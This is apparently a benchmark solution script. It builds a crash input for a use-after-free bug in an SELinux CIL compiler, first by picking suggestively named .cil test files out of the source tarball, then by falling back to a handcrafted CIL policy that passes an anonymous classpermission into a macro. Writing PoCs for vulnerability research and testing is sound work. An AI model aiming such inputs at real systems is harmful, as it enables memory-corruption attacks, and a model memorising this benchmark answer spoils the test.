import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Try to find an existing PoC or highly suspicious .cil file in the tarball
        try:
            with tarfile.open(src_path, "r:*") as tar:
                candidate_pocs = []

                # Step 1: Look for .cil files with very indicative names
                for member in tar.getmembers():
                    if not member.isfile():
                        continue
                    name_lower = member.name.lower()
                    if not name_lower.endswith(".cil"):
                        continue

                    if (
                        "uaf" in name_lower
                        or "use_after" in name_lower
                        or "use-after" in name_lower
                        or "double_free" in name_lower
                        or "double-free" in name_lower
                        or "anon" in name_lower
                        or "anonymous" in name_lower
                    ):
                        f = tar.extractfile(member)
                        if f is None:
                            continue
                        data = f.read()
                        if data:
                            candidate_pocs.append((len(data), data))

                if candidate_pocs:
                    candidate_pocs.sort(key=lambda x: x[0])
                    return candidate_pocs[0][1]

                # Step 2: Look for generic .cil files that contain the right
                # combination of keywords: macro + classpermission + classpermissionset
                candidate_pocs = []
                for member in tar.getmembers():
                    if not member.isfile():
                        continue
                    name_lower = member.name.lower()
                    if not name_lower.endswith(".cil"):
                        continue

                    f = tar.extractfile(member)
                    if f is None:
                        continue
                    data = f.read()
                    lower = data.lower()
                    if (
                        b"(macro" in lower
                        and b"classpermission" in lower
                        and b"classpermissionset" in lower
                    ):
                        candidate_pocs.append((len(data), data))

                if candidate_pocs:
                    candidate_pocs.sort(key=lambda x: x[0])
                    return candidate_pocs[0][1]

        except Exception:
            # If anything goes wrong while inspecting the tarball, fall back
            # to a handcrafted PoC.
            pass

        # Fallback: handcrafted CIL PoC designed from the vulnerability description.
        # It uses:
        #  - an anonymous classpermission
        #  - passed into a macro
        #  - the macro body contains a classpermissionset using that parameter
        poc = b"""(block block1
    (class file (read write getattr open))

    (macro anon_cp_macro ((cp classpermission))
        (classpermissionset localcps (cp))
    )

    (anon_cp_macro
        (classpermission
            (file (read))
        )
    )
)
"""
        return poc
